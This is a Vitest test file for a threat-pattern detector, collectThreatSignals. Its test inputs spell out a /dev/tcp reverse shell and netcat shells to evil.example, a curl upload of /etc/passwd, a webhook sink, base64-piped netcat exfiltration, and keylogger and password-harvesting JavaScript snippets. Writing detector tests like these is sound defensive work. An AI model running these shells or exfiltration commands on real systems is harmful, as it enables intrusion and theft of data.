import { describe, expect, it } from "vitest";
import { collectThreatSignals } from "../src/threatPatterns.js";

describe("collectThreatSignals", () => {
  it("detects reverse and bind shells", () => {
    const signals = collectThreatSignals(
      'bash -i >& /dev/tcp/evil.example/4444 0>&1\nnc -e /bin/sh evil.example 4444\n',
      "script.sh"
    );

    expect(signals.some((s) => s.family === "network-attack" && s.pattern === "reverse-shell-dev-tcp")).toBe(true);
    expect(signals.some((s) => s.family === "network-attack" && s.pattern === "reverse-shell-nc")).toBe(true);
  });

  it("detects SSRF and port scanning", () => {
    const signals = collectThreatSignals(
      "import requests\nrequests.get(target_url)\nsocket.connect_ex(('1.2.3.4', 80))\n",
      "app.py"
    );

    expect(signals.some((s) => s.pattern === "ssrf-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "port-scan")).toBe(true);
  });

  it("detects credential harvesting and keyloggers", () => {
    const signals = collectThreatSignals(
      'document.getElementById("password").value\nwindow.addEventListener("keydown", e => send(e.key))\n',
      "app.js"
    );

    expect(signals.some((s) => s.family === "phishing" && s.pattern === "credential-harvest")).toBe(true);
    expect(signals.some((s) => s.family === "phishing" && s.pattern === "keylogger")).toBe(true);
  });

  it("detects webhook, encoded, non-http, and file-upload exfiltration sinks", () => {
    const signals = collectThreatSignals(
      'curl -d @/etc/passwd https://evil.example/upload\ncurl https://discord.com/api/webhooks/123/abc\necho secret | base64 -d | nc evil.example 4444\n',
      "exfil.sh"
    );

    expect(signals.some((s) => s.pattern === "webhook-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "encoded-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "non-http-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "file-upload-sink")).toBe(true);
  });

  it("records line numbers and deduplicates identical signals", () => {
    const signals = collectThreatSignals(
      "nc -e /bin/sh evil.example 4444\nnc -e /bin/sh evil.example 4444\n",
      "a.sh"
    );

    expect(signals.filter((s) => s.pattern === "reverse-shell-nc")).toHaveLength(1);
    expect(signals.find((s) => s.pattern === "reverse-shell-nc")?.line).toBe(1);
  });
});
